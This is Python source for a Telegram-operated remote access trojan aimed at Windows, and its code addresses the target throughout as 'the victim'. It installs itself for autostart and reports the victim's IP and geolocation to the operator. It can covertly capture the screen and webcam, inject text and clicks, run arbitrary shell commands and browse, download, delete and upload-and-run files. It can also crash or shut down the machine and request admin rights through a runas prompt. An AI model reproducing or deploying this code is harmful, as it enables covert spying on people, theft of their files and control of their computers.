import telebot, requests, os, webbrowser, socket, ctypes, sys, pyautogui, subprocess, cv2, time, moviepy, numpy, av, wave, threading, pathlib, tempfile
from telebot import types
from utils.UtilsGUI import ScreenShot , take_photo, convert_avi_to_mp4, ScreenVideo, CameraVideo 
from utils.UtilsFUN import SendMessage, VoiceMsgPlaying, start_glitch, bsod
from utils.System import set_volume, get_process_list,task_killer, get_devices
from utils.UtilsCD import get_items, upload_play_file
from utils.AutoStart import autostart_reg
from config import BOToken, Chat_ID
from moviepy import VideoFileClip, clips_array
from pathlib import Path

autostart_reg()

bot = telebot.TeleBot(BOToken)
chat_id = Chat_ID
commands_msg = None

victim_ip = requests.get('https://icanhazip.com/').text.strip()

def get_victim_geo(ip):
    response = requests.get(f'http://ip-api.com/json/{ip}')
    geo_data = response.json()
    
    continent = geo_data.get("continentCode")
    country   = geo_data.get("country")
    region    = geo_data.get("regionName")
    city      = geo_data.get("city")
    time_zone = geo_data.get("timezone")
    latitude  = geo_data.get("lat")
    longitude = geo_data.get("lon")
    
    return continent, country, region, city, time_zone, latitude, longitude

continent, country, region, city, time_zone, latitude, longitude = get_victim_geo(victim_ip)

def check_root():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def check_admin_status():
    if check_root() == True:
        return "✔"
    else:
        return "✖"
        
bot.send_message(chat_id, f"*Server is working!*\n\n*Victim's IP:*\n{victim_ip}\n*Geo:*\nContinent: {continent}\nCountry: {country}\nRegion: {region}\nCity: {city}\nTime Zone: {time_zone}\n\n[Exact Geo](https://www.google.com/maps?q={latitude},{longitude})\n\n*Root Permissions: {check_admin_status()}*", parse_mode='Markdown')


def handle_permission_error():
    RootKeyboard = types.InlineKeyboardMarkup()
    AskRootButton = types.InlineKeyboardButton("⚠️ Ask Root Permissions?", callback_data="AskRoot")
    RootKeyboard.add(AskRootButton)
    bot.send_message(chat_id, "*Premission Error!*\n\nThis action requires Root Permissions\n\n_The request may arouse suspicion in the victim_", parse_mode="Markdown", reply_markup=RootKeyboard)

@bot.callback_query_handler(func=lambda call: call.data == "AskRoot")
def RootRestart(call):
    bot.stop_polling()
    ctypes.windll.shell32.ShellExecuteW(
        None, "runas", sys.executable, " ".join(sys.argv), None, 1
    )

    sys.exit(0)

keyboard1 = types.InlineKeyboardMarkup()

functions1 = [
    ("ScreenShot", 'ScreenShotCall'),
    ("WebCam photo", 'WebPhotoCall'),
    ("Screen video", 'ScreenVideoCall'),
    ("WebCam video", 'WebVideoCall'),
    ("Cam & Screen video", 'WebScreenVideoCall'),
    ("Mouse click", 'MouseClickCall'),
    ("Enter text", 'EnterTextCall')
]

for function_name, callback in functions1:
    keyboard1.add(types.InlineKeyboardButton(function_name, callback_data=callback))

keyboard1.add(
    types.InlineKeyboardButton("⠀", callback_data='Nothing'),
    types.InlineKeyboardButton("GUI", callback_data='Nothing'),
    types.InlineKeyboardButton("→", callback_data='right1')
)

keyboard2 = types.InlineKeyboardMarkup()

functions2 = [
    ("Open link in browser", 'BrowserOpenCall'),
    ("Message/Allert to victim", 'FakeMessageCall'),
    ("BSOD (temporary system crash)", 'BsodCall'),
    ("Play voice message", 'VoiceMessageCall'),
    ("Reverse Shell (execute commands in CMD)", 'ReverseShellCall'),
    ("Glitch", 'GlitchCall'),
    ("Invert mouse buttons (toggle)", 'InvertMBCall')
]

for function_name, callback in functions2:
    keyboard2.add(types.InlineKeyboardButton(function_name, callback_data=callback))

keyboard2.add(
    types.InlineKeyboardButton("←", callback_data='left1'),
    types.InlineKeyboardButton("FUN", callback_data='Nothing'),
    types.InlineKeyboardButton("→", callback_data='right2')
)

keyboard3 = types.InlineKeyboardMarkup()

functions3 = [
    ("CD Active Manager", 'CDMgrCall'),
    ("Upload&Play file", 'UpdFileCall'),
    
]

for function_name, callback in functions3:
    keyboard3.add(types.InlineKeyboardButton(function_name, callback_data=callback))

keyboard3.add(
    types.InlineKeyboardButton("←", callback_data='left2'),
    types.InlineKeyboardButton("CD", callback_data='Nothing'),
    types.InlineKeyboardButton("→", callback_data='right3')
)

keyboard4 = types.InlineKeyboardMarkup()

functions4= [
    ("Power Off", 'PowerCall'),
    ("Reboot", 'RebootCall'),
    ("Screen Off", 'ScrOffCall'),
    ("Change sound", 'ChngSoundCall'),
    ("Devices manager", 'MngDevicesCall'),
    ("Task killer", 'TskKllCall'), 
    ("Ask Root permissions", 'AskRoot')
]

for function_name, callback in functions4:
    keyboard4.add(types.InlineKeyboardButton(function_name, callback_data=callback))

keyboard4.add(
    types.InlineKeyboardButton("←", callback_data='left3'),
    types.InlineKeyboardButton("System", callback_data='Nothing'),
    types.InlineKeyboardButton("⠀", callback_data='Nothing')
)

@bot.message_handler(commands=['jerry'])
def commands(command):
    global commands_msg
    commands_msg = bot.send_message(chat_id, "*Available actions for remote access:*", parse_mode='Markdown', reply_markup=keyboard1)


@bot.callback_query_handler(func=lambda call: call.data == "right1")
def change_keyboard1(call):
    global commands_msg
    bot.edit_message_text("*Available actions for remote access:*", chat_id=chat_id, message_id=commands_msg.message_id, parse_mode='Markdown', reply_markup=keyboard2)

@bot.callback_query_handler(func=lambda call: call.data == "right2")
def change_keyboard(call):
    global commands_msg
    bot.edit_message_text("*Available actions for remote access:*", chat_id=chat_id, message_id=commands_msg.message_id, parse_mode='Markdown', reply_markup=keyboard3)

@bot.callback_query_handler(func=lambda call: call.data == "left1")
def change_keyboard(call):
    global commands_msg
    bot.edit_message_text("*Available actions for remote access:*", chat_id=chat_id, message_id=commands_msg.message_id, parse_mode='Markdown', reply_markup=keyboard1)

@bot.callback_query_handler(func=lambda call: call.data == "left2")
def change_keyboard(call):
    global commands_msg
    bot.edit_message_text("*Available actions for remote access:*", chat_id=chat_id, message_id=commands_msg.message_id, parse_mode='Markdown', reply_markup=keyboard2)

@bot.callback_query_handler(func=lambda call: call.data == "right3")
def change_keyboard(call):
    global commands_msg
    bot.edit_message_text("*Available actions for remote access:*", chat_id=chat_id, message_id=commands_msg.message_id, parse_mode='Markdown', reply_markup=keyboard4)

@bot.callback_query_handler(func=lambda call: call.data == "left3")
def change_keyboard(call):
    global commands_msg
    bot.edit_message_text("*Available actions for remote access:*", chat_id=chat_id, message_id=commands_msg.message_id, parse_mode='Markdown', reply_markup=keyboard3)

@bot.callback_query_handler(func=lambda call: call.data == "ScreenShotCall")
def ScreenShotFunc(call):
    try:
        ScreenShot()
        with open("ScreenShot.png", 'rb') as img:
            bot.send_photo(chat_id, img)
        time.sleep(15)
        os.remove("ScreenShot.png")
    except PermissionError:
        handle_permission_error()
    except Exception as e:
        bot.send_message(chat_id, f"*Error:* {e}", parse_mode="Markdown")


@bot.callback_query_handler(func=lambda call: call.data == "WebPhotoCall")
def WebPhotoFunc(call):
    try:
        if take_photo() == False:
            bot.send_message(chat_id, "The victim does not have any camera or image not captured correctly")
        else:
            with open("WebCamPhoto.png", 'rb') as img:
                bot.send_photo(chat_id, img)
            time.sleep(15)
            os.remove("WebCamPhoto.png")
    except PermissionError:
        handle_permission_error()
    except Exception as e:
        bot.send_message(chat_id, f"*Error:* {e}", parse_mode="Markdown")


@bot.callback_query_handler(func=lambda call: call.data == "ScreenVideoCall")
def ScreenVideoFunc(call):
    bot.send_message(chat_id, "*Enter the recording time in minutes* (up to 300)", parse_mode="Markdown")
    bot.register_next_step_handler(call.message, process_video_timeScreen)


def process_video_timeScreen(message):
    try:
        VideoTime = float(message.text)
        if 0 < VideoTime < 300:
            bot.send_message(chat_id, "*Recording...*", parse_mode="Markdown")
            if ScreenVideo(duration_minutesScreen=VideoTime) == False:
                bot.send_message(chat_id, "The video not captured correctly")
            else:
                bot.send_message(chat_id, "*Converting...*", parse_mode="Markdown")
                convert_avi_to_mp4("output.avi", "ScreenVideo.mp4")
                with open("ScreenVideo.mp4", "rb") as video:
                    bot.send_video(chat_id, video)
                time.sleep(15)
                os.remove("output.avi")
                os.remove("ScreenVideo.mp4")
        else:
            bot.send_message(chat_id, "*Please enter the time in the correct format* (only numbers up to 300)", parse_mode="Markdown")
            bot.register_next_step_handler(message, process_video_timeScreen)


    except ValueError:
        bot.send_message(chat_id, "*Please enter the time in the correct format* (only numbers up to 300)", parse_mode="Markdown")
        bot.register_next_step_handler(message, process_video_timeScreen)

    except PermissionError:
        handle_permission_error()

    except Exception as e:
        bot.send_message(chat_id, f"*Error:* {e}", parse_mode="Markdown")


@bot.callback_query_handler(func=lambda call: call.data == "WebVideoCall")
def WebVideoFunc(call):
    bot.send_message(chat_id, "*Enter the recording time in minutes* (up to 300)", parse_mode="Markdown")
    bot.register_next_step_handler(call.message, process_video_timeWeb)

def process_video_timeWeb(message):
    try:
        VideoTime = float(message.text)
        if 0 < VideoTime < 300:
            bot.send_message(chat_id, "*Recording...*", parse_mode="Markdown")
            if CameraVideo(duration_minutesWeb=VideoTime) == False:
                bot.send_message(chat_id, "The victim does not have any camera or video not captured correctly")
            else:
                bot.send_message(chat_id, "*Converting...*", parse_mode="Markdown")
                convert_avi_to_mp4("camera_output.avi", "WebVideo.mp4")
                with open("WebVideo.mp4", "rb") as WebVideo:
                    bot.send_video(chat_id, WebVideo)
                time.sleep(15)
                os.remove("WebVideo.mp4")
                os.remove("camera_output.avi")
        else:
            bot.send_message(chat_id, "*Please enter the time in the correct format* (only numbers up to 300)", parse_mode="Markdown")
            bot.register_next_step_handler(message, process_video_timeWeb)


    except ValueError:
        bot.send_message(chat_id, "*Please enter the time in the correct format* (only numbers up to 300)", parse_mode="Markdown")
        bot.register_next_step_handler(message, process_video_timeWeb)

    except PermissionError:
        handle_permission_error()

    except Exception as e:
        bot.send_message(chat_id, f"*Error:* {e}", parse_mode="Markdown")


@bot.callback_query_handler(func=lambda call: call.data == "WebScreenVideoCall")
def CombinedVideoFunc(call):
    bot.send_message(chat_id, "*Enter the recording time in minutes* (up to 300)", parse_mode="Markdown")
    bot.register_next_step_handler(call.message, process_combined_video)


def process_combined_video(message):
    try:
        duration = float(message.text)
        if 0 < duration < 300:
            bot.send_message(chat_id, "*Recording screen and webcam...*", parse_mode="Markdown")

            screen_thread = threading.Thread(target=ScreenVideo, kwargs={"duration_minutesScreen": duration})
            cam_thread = threading.Thread(target=CameraVideo, kwargs={"duration_minutesWeb": duration})

            screen_thread.start()
            cam_thread.start()

            screen_thread.join()
            cam_thread.join()

            if not os.path.exists("output.avi") or not os.path.exists("camera_output.avi"):
                bot.send_message(chat_id, "*Failed to record one or both sources (maybe the victim doesn't have a webcam)*", parse_mode="Markdown")
                return

            convert_avi_to_mp4("output.avi", "screen.mp4")
            convert_avi_to_mp4("camera_output.avi", "webcam.mp4")

            clip1 = VideoFileClip("screen.mp4")
            clip2 = VideoFileClip("webcam.mp4")

            final = clips_array([[clip1, clip2]])
            final.write_videofile("combined.mp4")

            with open("combined.mp4", 'rb') as video:
                bot.send_video(chat_id, video)

            for f in ["output.avi", "camera_output.avi", "screen.mp4", "webcam.mp4", "combined.mp4"]:
                if os.path.exists(f):
                    os.remove(f)
        else:
            bot.send_message(chat_id, "*Please enter the time in the correct format* (only numbers up to 300)", parse_mode="Markdown")
            bot.register_next_step_handler(message, process_combined_video)

    except ValueError:
        bot.send_message(chat_id, "*Please enter the time in the correct format* (only numbers up to 300)", parse_mode="Markdown")
        bot.register_next_step_handler(message, process_combined_video)

    except PermissionError:
        handle_permission_error()

    except Exception as e:
        bot.send_message(chat_id, f"*Error:* {e}", parse_mode="Markdown")
        


@bot.callback_query_handler(func=lambda call: call.data == "MouseClickCall")
def MouseClickChose(call):
    keyboardClick = types.InlineKeyboardMarkup()
    keyboardClick.add(types.InlineKeyboardButton("LKM", callback_data="leftClickCall"), types.InlineKeyboardButton("RKM", callback_data="rightClickCall"))
    bot.send_message(chat_id, "*Chose:*", parse_mode="Markdown", reply_markup=keyboardClick)

@bot.callback_query_handler(func=lambda call: call.data == "leftClickCall")
def LeftClickFunc(call):
    try:
        pyautogui.click()
        bot.send_message(chat_id, "*Clicked*", parse_mode="Markdown")
    except Exception as e:
        bot.send_message(chat_id, f"*Error:* {e}", parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "rightClickCall")
def LeftClickFunc(call):
    try:
        pyautogui.rightClick()
        bot.send_message(chat_id, "*Clicked*", parse_mode="Markdown")
    except Exception as e:
        bot.send_message(chat_id, f"*Error:* {e}", parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data=="EnterTextCall")
def EnterTextRequest(call):
    bot.send_message(chat_id, "*Enter text to emulate on victim's pc*", parse_mode="Markdown")
    bot.register_next_step_handler(call.message, EnterTextFunc)


def EnterTextFunc(message):
    try:
        EmulateText = message.text
        pyautogui.write(EmulateText)
        bot.send_message(chat_id, f"*Text entered successfully:* {EmulateText}", parse_mode="Markdown")
    except Exception as e:
        bot.send_message(chat_id, f"*Error:* {e}", parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data=="BrowserOpenCall")
def LinkTextRequest(call):
    bot.send_message(chat_id, "*Enter link in any formats*", parse_mode="Markdown")
    bot.register_next_step_handler(call.message, LinkOpening)

def LinkOpening(message):
    LinkText = message.text.strip()
    if not LinkText.startswith(('http://', 'https://')):
        DoneUrl = 'https://' + LinkText
    else:
        DoneUrl = LinkText

    try:
        response = requests.head(DoneUrl, allow_redirects=True, timeout=5)
        if response.status_code < 400:
            webbrowser.open(DoneUrl)
            bot.send_message(chat_id, "*Success ✔", parse_mode="Markdown")
        else:
            bot.send_message(chat_id, "*⚠ This link is not valid, try again or change it*", parse_mode="Markdown")
    except requests.RequestException:
        bot.send_message(chat_id, "*⚠ Failed to open link — it doesn't exist or timed out*", parse_mode="Markdown")




@bot.callback_query_handler(func=lambda call: call.data == "FakeMessageCall")
def TitleTextR(call):
    bot.send_message(chat_id, "*Enter message title*", parse_mode="Markdown")
    bot.register_next_step_handler(call.message, MessageTextR)

def MessageTextR(message):
    MessageTitle = message.text
    bot.send_message(chat_id, "*Enter message text*", parse_mode="Markdown")
    bot.register_next_step_handler(message, MessageIconR, MessageTitle)

def MessageIconR(message, MessageTitle):
    MessageText = message.text
    bot.send_message(
        chat_id,
        "*Choose message icon*\n\nInformation - 1\nError - 2\nWarning - 3\nQuestion - 4",
        parse_mode="Markdown"
    )
    bot.register_next_step_handler(message, MessageButtonR, MessageTitle, MessageText)

def MessageButtonR(message, MessageTitle, MessageText):
    IconNumber = message.text.strip()

    if IconNumber not in ['1', '2', '3', '4']:
        bot.send_message(chat_id, "*⚠ Please, enter a valid icon number (1–4)*", parse_mode="Markdown")
        bot.register_next_step_handler(message, MessageButtonR, MessageTitle, MessageText)
        return

    bot.send_message(
        chat_id,
        "*Choose message button*\n\n"
        "1 - OK\n"
        "2 - OK/Cancel\n"
        "3 - Abort/Retry/Ignore\n"
        "4 - Yes/No/Cancel\n"
        "5 - Yes/No\n"
        "6 - Retry/Cancel\n"
        "7 - Cancel/Retry/Continue",
        parse_mode="Markdown"
    )
    bot.register_next_step_handler(message, MessageCreation, MessageTitle, MessageText, IconNumber)

def MessageCreation(message, MessageTitle, MessageText, IconNumber):
    ButtonNumber = message.text.strip()

    if ButtonNumber not in ['1', '2', '3', '4', '5', '6', '7']:
        bot.send_message(chat_id, "*⚠ Please, enter a valid button number (1–7)*", parse_mode="Markdown")
        bot.register_next_step_handler(message, MessageCreation, MessageTitle, MessageText, IconNumber)
        return

    IconNumber = int(IconNumber)
    ButtonNumber = int(ButtonNumber)

    icon_map = {1: 0x40, 2: 0x10, 3: 0x30, 4: 0x20}
    button_map = {1: 0, 2: 1, 3: 2, 4: 3, 5: 4, 6: 5, 7: 6}

    IconValue = icon_map.get(IconNumber, 0)
    ButtonValue = button_map.get(ButtonNumber, 0)

    try:
        SendMessage(MessageTitle, MessageText, IconValue, ButtonValue)
        bot.send_message(chat_id, "*Success ✔*", parse_mode="Markdown")
    except Exception as e:
        bot.send_message(chat_id, f"*Error:* `{e}`", parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data=="BsodCall")
def BsodCallFunc(call):
    try:
        bot.send_message(chat_id, "✔ *BSOD is running, the victim's PC can be rebooted*", parse_mode="Markdown")
        bsod()
    except Exception as e:
        bot.send_message(chat_id, f"*Error:* {e}", parse_mode="Markdown")


@bot.callback_query_handler(func=lambda call: call.data=="VoiceMessageCall")
def ReceiveVoiceMsg(call):
    bot.send_message(chat_id, "*Send a voice message*", parse_mode="Markdown")
    bot.register_next_step_handler(call.message, SoundCreation)
    
def SoundCreation(message):
    try:
        if VoiceMsgPlaying(message, bot):
            bot.send_message(chat_id, "*Reproduced ✔*", parse_mode="Markdown")
        else:
            bot.send_message(chat_id, "*⚠️ Send a voice message*", parse_mode="Markdown")
    except Exception as e:
        bot.send_message(chat_id, f"*Error:* {e}", parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data=="ReverseShellCall")
def ReverseShellInput(call):
    bot.send_message(chat_id, "*Send a command for execution it on CMD*", parse_mode="Markdown")
    bot.register_next_step_handler(call.message, ReverseShellOutput)

def ReverseShellOutput(message):
    command = message.text
    try:
        result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        try:
            output = result.stdout.decode('cp866', errors='ignore') + result.stderr.decode('cp866', errors='ignore')
        except UnicodeDecodeError:
            output = result.stdout.decode(errors='ignore') + result.stderr.decode(errors='ignore')

        if result.returncode != 0:
            bot.send_message(chat_id, F"*⚠ Mistake in command:*\n{output}", parse_mode="Markdown")
            return

        if output:
            bot.send_message(chat_id, f"*Output:* {output}", parse_mode="Markdown")
        else:
            bot.send_message(chat_id, "*✔ The command was executed, but there is no output*", parse_mode="Markdown")

    except Exception as e:
        bot.send_message(chat_id, f"*Error:* {e}", parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data=="GlitchCall")
def GlitchTime(call):
    bot.send_message(chat_id, "*Enter the duration time of the glitch in minutes* (up to 300)", parse_mode="Markdown")
    bot.register_next_step_handler(call.message, GlitchStart)

def GlitchStart(message):
    try:
        duration_time = float(message.text)
        if 0 < duration_time < 300:
            duration_seconds = int(duration_time * 60)
            bot.send_message(chat_id, f"Glitch started for *{duration_time}* minutes", parse_mode="Markdown")
            start_glitch(duration_seconds)
        else:
            bot.send_message(chat_id, "*Please enter the time in the correct format* (only numbers up to 300)", parse_mode="Markdown")
            bot.register_next_step_handler(message, GlitchStart)

    except ValueError:
        bot.send_message(chat_id, "*Please enter the time in the correct format* (only numbers up to 300)", parse_mode="Markdown")
        bot.register_next_step_handler(message, GlitchStart)

    except Exception as e:
            bot.send_message(chat_id, f"*Error:* {e}", parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data=="InvertMBCall")
def InvertButtons(call):
    try:
        is_swapped = ctypes.windll.user32.GetSystemMetrics(23)
        ctypes.windll.user32.SwapMouseButton(not is_swapped)
        bot.send_message(chat_id, f"*✔ Mouse buttons are inverted*", parse_mode="Markdown")
    except Exception as e:
        bot.send_message(chat_id, f"*Error:* {e}", parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data=="PowerCall")
def PowerOff(call):
    try:
        bot.send_message(chat_id, "*✔ Shutting down*", parse_mode="Markdown")
        os.system('shutdown /s /t 0')

    except Exception as e:
        bot.send_message(chat_id, f"*Error:* {e}", parse_mode="Markdown")


@bot.callback_query_handler(func=lambda call: call.data=="RebootCall")
def Reboot(call):
    try:
        bot.send_message(chat_id, "*✔ Rebooting*", parse_mode="Markdown")
        os.system("shutdown /r /t 0")

    except Exception as e:
        bot.send_message(chat_id, f"*Error:* {e}", parse_mode="Markdown")


@bot.callback_query_handler(func=lambda call: call.data=="ScrOffCall")
def ScreenOff(call):
    try:
        bot.send_message(chat_id, "*✔ Succes*", parse_mode="Markdown")
        ctypes.windll.user32.SendMessageW(0xFFFF, 0x0112, 0xF170, 2)

    except Exception as e:
        bot.send_message(chat_id, f"*Error:* {e}", parse_mode="Markdown")


@bot.callback_query_handler(func=lambda call: call.data=="ChngSoundCall")
def SoundTime(call):
    bot.send_message(chat_id, f"*Enter volume level* (from 1 to 100)", parse_mode="Markdown")
    bot.register_next_step_handler(call.message, ChangeSound)

def ChangeSound(message):
    try:
        level = int(message.text)
        if set_volume(level):
            bot.send_message(chat_id, "*Success ✔*", parse_mode="Markdown")
    except ValueError:
        bot.send_message(chat_id, "*Please enter volume level in the correct format* (from 1 to 100)", parse_mode="Markdown")
        bot.register_next_step_handler(message, ChangeSound)

    except Exception as e:
        bot.send_message(chat_id, f"*Error:* {e}", parse_mode="Markdown")
        
@bot.callback_query_handler(func=lambda call: call.data=="TskKllCall")
def GetTasks(call):
    bot.send_message(chat_id, f"Active tasks:\n\n{get_process_list()}\n\nEnter the task number to kill")
    bot.register_next_step_handler(call.message, TaskKill)

def TaskKill(message):
    try:
        num = int(message.text)
        if task_killer(num):
            bot.send_message(chat_id, "*✔ Succes*", parse_mode="Markdown")
        else:
            bot.send_message(chat_id, "*Please enter the correct number*", parse_mode="Markdown")

    except PermissionError:
        handle_permission_error()

    except Exception as e:
        bot.send_message(chat_id, f"*Error:* {e}", parse_mode="Markdown")        

@bot.callback_query_handler(func=lambda call: call.data=="MngDevicesCall")
def ManagerDevices(call):
    bot.send_message(chat_id, f"Connected devices:\n{get_devices()}")  

path = Path("C:\\")
current_file = None

@bot.callback_query_handler(func=lambda call: call.data=="CDMgrCall")        
def CDMgr(call):
    global path
    items = get_items(path)
    markup = types.InlineKeyboardMarkup()
    for item in items:
        item_path = path / item
        if item_path.is_file():
            button = types.InlineKeyboardButton(text=f"📄 {item}", callback_data=f"cd_{item}")
            markup.add(button)
        if item_path.is_dir():
            button = types.InlineKeyboardButton(text=f"🗂 {item}", callback_data=f"cd_{item}")
            markup.add(button)

    markup.add(types.InlineKeyboardButton(text="⬅ Back", callback_data="cd_back"))
    bot.send_message(chat_id, f"*{path}*", parse_mode="Markdown", reply_markup=markup)



@bot.callback_query_handler(func=lambda call: call.data.startswith("cd_"))
def handle_navigation(call):
    try:
        global path
        
        if call.data == "cd_back":
            path = path.parent
        else:
            item_name = call.data.replace("cd_", "", 1)
            items = get_items(path)
            if item_name not in items:
                return
            selected = path / item_name
            
            if selected.is_file():
                file_actions(call.message, selected)
                return
            path = selected
        
        bot.answer_callback_query(call.id)
        new_items = get_items(path)
        markup = types.InlineKeyboardMarkup()
        for item in new_items:
            item_path = path / item
            if item_path.is_file():
                button = types.InlineKeyboardButton(text=f"📄 {item}", callback_data=f"cd_{item}")
                markup.add(button)
            if item_path.is_dir():
                button = types.InlineKeyboardButton(text=f"🗂 {item}", callback_data=f"cd_{item}")
                markup.add(button)
        markup.add(types.InlineKeyboardButton(text="⬅ Back", callback_data="cd_back"))
        bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=f"*{path}*", reply_markup=markup, parse_mode="Markdown")
    except PermissionError:
        handle_permission_error()

    except Exception as e:
        bot.send_message(chat_id, f"*Error:* {e}", parse_mode="Markdown")
        
def file_actions(message, file_path):
    global current_file
    current_file = file_path
    markup = types.InlineKeyboardMarkup()
    button = types.InlineKeyboardButton(text=f"Download", callback_data="file_download")
    button1 = types.InlineKeyboardButton(text=f"Rename", callback_data="file_rename")
    button2 = types.InlineKeyboardButton(text=f"Delete", callback_data="file_delete")
    markup.add(button, button1, button2)
    markup.add(types.InlineKeyboardButton(text="⬅ Back", callback_data="cd_back"))
    bot.edit_message_text(chat_id=chat_id, message_id=message.message_id, text=f"*{file_path}*", reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "file_download")
def file_download(call):
    try:
        global current_file
        with open(current_file, "rb") as f:
            bot.send_document(chat_id, f)
    except PermissionError:
        handle_permission_error()

    except Exception as e:
        bot.send_message(chat_id, f"*Error:* {e}", parse_mode="Markdown")
        
@bot.callback_query_handler(func=lambda call: call.data == "file_rename")
def file_get_name(call):
    bot.send_message(chat_id, "*Enter new file name:*", parse_mode="Markdown")
    bot.register_next_step_handler(call.message, file_rename)

def file_rename(message):
    try:
        global current_file
        current_file.rename(current_file.parent / message.text)
        bot.send_message(chat_id, f"File: *{current_file}* has renamed: *{current_file.parent / message.text}*", parse_mode="Markdown")
        current_file = current_file.parent / message.text
    except PermissionError:
        handle_permission_error()

    except Exception as e:
        bot.send_message(chat_id, f"*Error:* {e}", parse_mode="Markdown")
        
@bot.callback_query_handler(func=lambda call: call.data == "file_delete")
def file_delete(call):
    try:
        global current_file
        current_file.unlink()
        bot.send_message(chat_id, f"File: *{current_file}* has deleted", parse_mode="Markdown")
    except PermissionError:
        current_file = None
        handle_permission_error()

    except Exception as e:
        bot.send_message(chat_id, f"*Error:* {e}", parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "UpdFileCall")
def get_file(call):
    bot.send_message(chat_id, "*Send the file:*", parse_mode="Markdown")
    bot.register_next_step_handler(call.message, UpdPlay)

def UpdPlay(message):
    if not message.document:
        bot.send_message(chat_id, "*Send the file:*", parse_mode="Markdown")
        bot.register_next_step_handler(message, UpdPlay)
        return
    try:
        file_name = message.document.file_name
        f_info = bot.get_file(message.document.file_id)
        downloaded = bot.download_file(f_info.file_path)
        upload_play_file(file_name, downloaded)    
        bot.send_message(chat_id, f"*File successfully played*", parse_mode="Markdown")
    except Exception as e:
        bot.send_message(chat_id, f"*Error:* {e}", parse_mode="Markdown")


bot.polling(none_stop=False)
